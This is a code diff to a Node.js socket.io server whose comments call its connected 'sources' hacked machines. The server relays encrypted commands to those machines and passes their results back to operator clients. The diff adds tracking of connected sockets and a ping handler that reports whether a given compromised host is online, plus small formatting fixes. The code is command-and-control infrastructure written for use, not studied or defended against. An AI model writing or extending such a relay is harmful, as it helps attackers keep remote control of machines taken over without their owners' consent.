@@ -9,10 +9,11 @@ app.use(express.static("public"));
 
 // List of Sources
 const socketList = [];
-
+const connectedSockets = [];
 // Sources are the hacked machines
 // Listeners are the clients
 io.on('connection', function (socket) {
+    connectedSockets.push(socket.id);
     let socketID = null;
     let socketRoom = null;
     function updatedSocketList() {
@@ -41,6 +42,7 @@ io.on('connection', function (socket) {
 
     socket.on("disconnect", () => {
         console.log(`User disconnected: ${socketID}`);
+        connectedSockets.splice(connectedSockets.indexOf(socket.id), 1);
         if (socketRoom != "source") {
             return;
         }
@@ -94,14 +96,14 @@ io.on('connection', function (socket) {
     });
 
     socket.on("command", (socketID, encrypted) => {
-        if(!socketID || !encrypted) {
+        if (!socketID || !encrypted) {
             return socket.emit("message", "Bad Args");
         }
         io.to(socketID).emit("command", socket.id, encrypted);
     });
 
     socket.on("result", (socketID, encrypted) => {
-        if(!socketID || !encrypted) {
+        if (!socketID || !encrypted) {
             return socket.emit("message", "Bad Args");
         }
         io.to(socketID).emit("result", socket.id, encrypted);
@@ -109,6 +111,12 @@ io.on('connection', function (socket) {
 
     socket.on("rejectFromServer", (id, msg) => {
         io.to(id).emit("message", msg);
+    });
+
+    socket.on("pingID", (socketID) => {
+        console.log(connectedSockets);
+        const isConnected = connectedSockets.includes(socketID);
+        socket.emit('pingResponse', isConnected);
     });
 });
 
